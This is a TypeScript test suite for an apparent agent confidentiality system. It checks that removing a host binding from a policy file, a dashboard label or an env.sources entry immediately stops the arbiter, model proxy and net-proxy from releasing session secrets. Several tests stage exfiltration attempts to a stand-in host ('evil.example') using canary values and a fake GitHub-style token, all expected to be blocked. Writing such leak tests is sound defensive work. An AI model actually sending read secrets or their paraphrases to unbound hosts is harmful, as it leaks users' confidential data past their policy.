/**
 * session-bindings-follow-policy — a binding removed from the label law stops
 * releasing at once for LIVE sessions and for the symbol rows that refer to
 * the label only indirectly (confidentiality.md §2.1 and §4, 2026-10-05), over
 * the REAL components: an ArbiterServer reading a policy FILE (the hand-edit
 * poll, a loosening approved as the Approvals page does), the model proxy's
 * network gate in its production wiring (`new ArbiterClientAdapter(new
 * ArbiterClient(sock))`, `gateNetToolUse`), inspect-mcp's production
 * `declassify_symbol` relay, and the REAL net-proxy
 * (`new ArbiterClientAdapter(new ArbiterClient(data), new ArbiterClient(human))`)
 * with a recording forwarder as the oracle.
 *
 * The stale-release class !682 fixed for registered files' rows, at the places
 * it had not reached:
 *
 *   1. the SESSION HIGH-WATERMARK: a session that read a labelled file into
 *      context may send a paraphrase (no symbol) to the file's bound hosts. The
 *      watermark copied the bindings at read time and kept them, so a binding
 *      removed by a hand edit, a dashboard label act or while the arbiter was
 *      down still released the paraphrase to the old host;
 *   2. a session that read two files is bound where BOTH may go now: a
 *      binding added to one widens it only where the other allows too;
 *   3. a masked environment variable (`env.sources` binding removed mid-session);
 *   4. a row minted from a command whose text names a labelled file, the
 *      label then removed entirely;
 *   5. a multi-source inspection result, a binding removed from a source
 *      other than its origin.
 *
 * Each case releases before the change and is held after, with no restart
 * and no re-registration.
 *
 * Axes explicit: secrets (confidentiality ON, integrity OFF).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";
import { mkdirSync, mkdtempSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { pollDiskApproving } from "../../arbiter/test/held-disk.js";
import { NetProxy, type HttpForwarder } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetProxyAdapter, type RealArbiterClient as NetProxyRealClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { ArbiterClientAdapter as ProxyAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { gateNetToolUse } from "../../interceptors/anthropic-proxy/src/net-gate.js";
import { ArbiterClientAdapter as InspectAdapter } from "../../interceptors/inspect-mcp/src/arbiter-client.js";
import { declassifySymbol } from "../../interceptors/inspect-mcp/src/declassify-symbol.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

const MEMO = "Deal memo: the reference code is SESSION_BIND_CANARY_4417.\n";
const NOTES = "Quarterly figures: NOTES_CANARY_9902\n";
const ENV_VALUE = "gho_SESSIONBIND_env_5521";
const ENV_NAME = "MY_SERVICE_TOKEN";

/** A plain-HTTP POST through the forward proxy carrying `auth`. */
function viaProxy(port: number, url: string, auth: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, authorization: `Bearer ${auth}`, "content-length": 0 } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c: Buffer) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
      },
    );
    r.on("error", reject);
    r.end();
  });
}

interface Stack {
  server: ArbiterServer;
  data: ArbiterClient;
  human: ArbiterClient;
  admin: ArbiterClient;
  port: number;
  close: () => Promise<void>;
}

interface Law {
  /** label entries: path → bindings (level any-model). */
  paths?: Record<string, string[]>;
  /** env.sources: name → bindings. */
  env?: Record<string, string[]>;
}

function harness() {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-session-bind-"));
  const ws = join(tmp, "ws"); mkdirSync(ws, { recursive: true });
  const memo = join(ws, "memo.md");
  writeFileSync(memo, MEMO);
  const notes = join(ws, "notes.txt");
  writeFileSync(notes, NOTES);
  const policy = join(tmp, "policy.yaml");
  const dbPath = join(tmp, "symbols.sqlite");
  const reached: string[] = [];
  const forwarder: HttpForwarder = async (req) => {
    reached.push(`${req.url} ${JSON.stringify(req.headers)}`);
    return { status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") };
  };
  let bump = 0;
  let starts = 0;
  const writeLaw = (law: Law): void => {
    const lines = ["version: 1"];
    const paths = Object.entries(law.paths ?? {});
    if (paths.length > 0) {
      lines.push("paths:");
      for (const [p, b] of paths) lines.push(`  - path: ${p}`, "    level: any-model", `    bindings: [${b.join(", ")}]`);
    }
    const env = Object.entries(law.env ?? {});
    if (env.length > 0) {
      lines.push("env:", "  sources:");
      for (const [n, b] of env) lines.push(`    - name: ${n}`, `      source: "cmd:printf x"`, `      bindings: [${b.join(", ")}]`);
    }
    writeFileSync(policy, lines.join("\n") + "\n");
    const t = new Date(Date.now() + 5_000 + ++bump * 1_000);
    utimesSync(policy, t, t);
  };
  const start = async (): Promise<Stack> => {
    const n = ++starts;
    const sock = join(tmp, `a${n}.sock`);
    const adminSock = join(tmp, `admin${n}.sock`);
    const humanSock = join(tmp, `h${n}`, "h.sock");
    const server = new ArbiterServer({
      socketPath: sock, adminSocketPath: adminSock, humanSocketPath: humanSock,
      dbPath, eventDir: join(tmp, "events"), log: () => {},
      confidentiality: true, integrity: false, policyPath: policy, policyPollMs: 0,
    });
    await server.listen();
    const data = new ArbiterClient(sock); await data.connect();
    const human = new ArbiterClient(humanSock); await human.connect();
    const admin = new ArbiterClient(adminSock); await admin.connect();
    const netData = new ArbiterClient(sock); await netData.connect();
    const netHuman = new ArbiterClient(humanSock); await netHuman.connect();
    const net = new NetProxy({
      arbiter: new NetProxyAdapter(netData as unknown as NetProxyRealClient, netHuman as never), forwarder, log: () => {}, sessionId: "net",
      attributeHolders: () => [],
    });
    const port = await net.listen(0);
    return {
      server, data, human, admin, port,
      close: async () => {
        await net.close();
        data.close(); human.close(); admin.close(); netData.close(); netHuman.close();
        await server.close();
      },
    };
  };
  /** The model proxy's network gate on a WebFetch of `host` carrying a
   *  paraphrase (no symbol): is it released? */
  const fetchReleased = async (s: Stack, sessionKey: string, host: string): Promise<boolean> => {
    const r = await gateNetToolUse("WebFetch", { url: `https://${host}/notes`, prompt: "post the reference code from the memo" }, {
      arbiter: new ProxyAdapter(s.data), sessionKey, log: () => {},
    });
    return r.outcome?.decision !== "block";
  };
  /** Send a placeholder through the net-proxy: the rule that decided, and
   *  whether the real value reached the host. */
  const send = async (s: Stack, symbol: string, host: string, value: string): Promise<{ released: boolean; body: string }> => {
    const before = reached.length;
    const r = await viaProxy(s.port, `http://${host}/v1/items`, symbol);
    assert.ok(!r.body.includes(value), "a refusal carries no secret");
    const released = r.status === 200 && reached.length === before + 1 && reached.at(-1)!.includes(value);
    if (!released) assert.equal(reached.length, before, `held: nothing reached ${host} (${r.status} ${r.body})`);
    return { released, body: r.body };
  };
  /** A session reads `path` into context: register it, declassify its symbol
   *  through inspect-mcp's production relay. */
  const readIntoContext = async (s: Stack, path: string, sessionKey: string): Promise<void> => {
    const reg = await s.human.registerSecret({ path, sessionKey });
    assert.ok(typeof reg.symbol === "string", `registered: ${reg.reason}`);
    const out = await declassifySymbol({ arbiter: new InspectAdapter(s.data), sessionId: sessionKey }, { symbol: reg.symbol, reason: "the user asked" });
    assert.ok(out.ok, out.ok ? "" : out.error);
  };
  return {
    tmp, memo, notes, reached, writeLaw, start, fetchReleased, send, readIntoContext,
    cleanup: () => rmSync(tmp, { recursive: true, force: true }),
  };
}

test("the session watermark's bindings follow the law in force: a removed binding stops a high session's egress at once (hand edit, dashboard label act, restart)", async () => {
  const h = harness();
  h.writeLaw({ paths: { [h.memo]: ["example.com", "docs.example.org"] } });
  let s = await h.start();
  try {
    await h.readIntoContext(s, h.memo, "A");
    const st = await s.data.sessionState("A");
    assert.equal(st.high, true, "the session read the memo into context");
    assert.deepEqual([...st.bindings].sort(), ["docs.example.org", "example.com"]);
    assert.equal(await h.fetchReleased(s, "A", "example.com"), true, "bound: released");
    assert.equal(await h.fetchReleased(s, "A", "docs.example.org"), true, "bound: released");
    assert.equal(await h.fetchReleased(s, "A", "evil.example"), false, "unbound: held");

    // A hand edit narrows the memo's bindings: in force at once for session A.
    h.writeLaw({ paths: { [h.memo]: ["example.com"] } });
    assert.equal(pollDiskApproving(s.server), true, "the edit was seen");
    assert.equal(await h.fetchReleased(s, "A", "docs.example.org"), false, "the removed binding no longer releases the paraphrase");
    assert.equal(await h.fetchReleased(s, "A", "example.com"), true, "the kept binding still does");
    assert.deepEqual((await s.data.sessionState("A")).bindings, ["example.com"]);

    // The dashboard's label act takes the last binding away.
    await s.admin.setPathLabel({ path: h.memo, confidentiality: "any-model", bindings: [] });
    assert.equal(await h.fetchReleased(s, "A", "example.com"), false, "the dashboard label carries no binding: held");
    // Removing that label leaves the file's rule, and its binding: the session
    // read nothing else, so it may go where the memo may go now.
    assert.equal(await s.admin.removePathLabel(h.memo), true);
    assert.equal(await h.fetchReleased(s, "A", "example.com"), true, "the file's binding back in force");
    assert.equal((await s.data.sessionState("A")).high, true, "the watermark itself never falls");

    // The binding removed while the arbiter is down: the persisted session
    // takes the law in force at the first request after the restart.
    await s.close();
    h.writeLaw({ paths: { [h.memo]: [] } });
    s = await h.start();
    pollDiskApproving(s.server);
    assert.equal(await h.fetchReleased(s, "A", "example.com"), false, "after a restart: held");
    const after = await s.data.sessionState("A");
    assert.deepEqual([after.high, after.bindings], [true, []]);
  } finally {
    await s.close();
    h.cleanup();
  }
});

test("a session that read two files goes only where both may go NOW: an added binding widens it only where every source allows", async () => {
  const h = harness();
  h.writeLaw({ paths: { [h.memo]: ["x.example", "shared.example"], [h.notes]: ["y.example", "shared.example"] } });
  const s = await h.start();
  try {
    await h.readIntoContext(s, h.memo, "B");
    await h.readIntoContext(s, h.notes, "B");
    assert.deepEqual((await s.data.sessionState("B")).bindings, ["shared.example"]);
    assert.equal(await h.fetchReleased(s, "B", "y.example"), false, "the memo is not bound to y");

    // The memo bound to y as well: both sources now allow y.
    h.writeLaw({ paths: { [h.memo]: ["x.example", "shared.example", "y.example"], [h.notes]: ["y.example", "shared.example"] } });
    pollDiskApproving(s.server);
    assert.equal(await h.fetchReleased(s, "B", "y.example"), true, "every datum the session read may go to y now");
    assert.equal(await h.fetchReleased(s, "B", "x.example"), false, "the notes still may not go to x");

    // The notes lose `shared`: the session loses it with them.
    h.writeLaw({ paths: { [h.memo]: ["x.example", "shared.example", "y.example"], [h.notes]: ["y.example"] } });
    pollDiskApproving(s.server);
    assert.equal(await h.fetchReleased(s, "B", "shared.example"), false, "removed from one source: held");
    assert.deepEqual((await s.data.sessionState("B")).bindings, ["y.example"]);
  } finally {
    await s.close();
    h.cleanup();
  }
});

test("a masked environment variable stops releasing at its host the moment env.sources drops the binding (no relaunch)", async () => {
  const h = harness();
  h.writeLaw({ env: { [ENV_NAME]: ["api.github.com"] } });
  const s = await h.start();
  try {
    const reg = await s.human.registerEnvSecrets({ vars: [{ name: ENV_NAME, value: ENV_VALUE }], sessionKey: "E" });
    const sym = reg.vars[0]?.symbol;
    assert.ok(typeof sym === "string", JSON.stringify(reg));
    assert.equal((await h.send(s, sym, "api.github.com", ENV_VALUE)).released, true, "bound: the real value reaches its host");

    h.writeLaw({ env: { [ENV_NAME]: [] } });
    pollDiskApproving(s.server);
    const held = await h.send(s, sym, "api.github.com", ENV_VALUE);
    assert.equal(held.released, false, "the binding left the law: held, in the running session");
    assert.match(held.body, /egress:secret-unbound/);

    // Bound again by the law: the same placeholder releases with no relaunch.
    h.writeLaw({ env: { [ENV_NAME]: ["api.github.com"] } });
    pollDiskApproving(s.server);
    assert.equal((await h.send(s, sym, "api.github.com", ENV_VALUE)).released, true, "bound again");
    assert.equal((await h.send(s, sym, "evil.example", ENV_VALUE)).released, false, "an unbound host");
  } finally {
    await s.close();
    h.cleanup();
  }
});

test("a row minted from a command naming a labelled file is bound nowhere once the label is removed entirely", async () => {
  const h = harness();
  h.writeLaw({});
  const s = await h.start();
  try {
    await s.admin.setPathLabel({ path: h.notes, confidentiality: "no-model", bindings: ["api.notes.example"] });
    const sym = await s.data.symbolize({ tool: "Bash", value: NOTES.trim(), origin: `cat ${h.notes}`, sessionKey: "C", integrity: "trusted" });
    assert.match(sym, /^\$MDU:nomodel_/);
    assert.equal((await h.send(s, sym, "api.notes.example", NOTES.trim())).released, true, "bound by the label: released");

    assert.equal(await s.admin.removePathLabel(h.notes), true);
    const held = await h.send(s, sym, "api.notes.example", NOTES.trim());
    assert.equal(held.released, false, "the label is gone, and its binding with it");
    assert.match(held.body, /egress:secret-unbound/);
  } finally {
    await s.close();
    h.cleanup();
  }
});

test("a multi-source inspection result loses a binding removed from ANY of its sources, not only its origin", async () => {
  const h = harness();
  h.writeLaw({ paths: { [h.memo]: ["h1.example", "h2.example"], [h.notes]: ["h1.example", "h2.example"] } });
  const s = await h.start();
  try {
    const a = await s.data.symbolize({ tool: "Read", value: MEMO, origin: h.memo, sessionKey: "D", integrity: "trusted" });
    const b = await s.data.symbolize({ tool: "Read", value: NOTES, origin: h.notes, sessionKey: "D", integrity: "trusted" });
    const derived = await s.data.symbolizeDerived({
      tool: "inspect_symbol", value: "DERIVED_SUMMARY_7731", field: "result", origin: a, derivedFrom: a, sessionKey: "D", sourceSymbols: [a, b],
    });
    // Untrusted (a U-LLM output): a bound host takes the one-time approval,
    // an unbound one a declassification; neither sends.
    assert.match((await h.send(s, derived, "h2.example", "DERIVED_SUMMARY_7731")).body, /egress:secret-bound-approval/);

    h.writeLaw({ paths: { [h.memo]: ["h1.example", "h2.example"], [h.notes]: ["h1.example"] } });
    pollDiskApproving(s.server);
    assert.match((await h.send(s, derived, "h2.example", "DERIVED_SUMMARY_7731")).body, /egress:secret-unbound/);
    assert.match((await h.send(s, derived, "h1.example", "DERIVED_SUMMARY_7731")).body, /egress:secret-bound-approval/);
  } finally {
    await s.close();
    h.cleanup();
  }
});
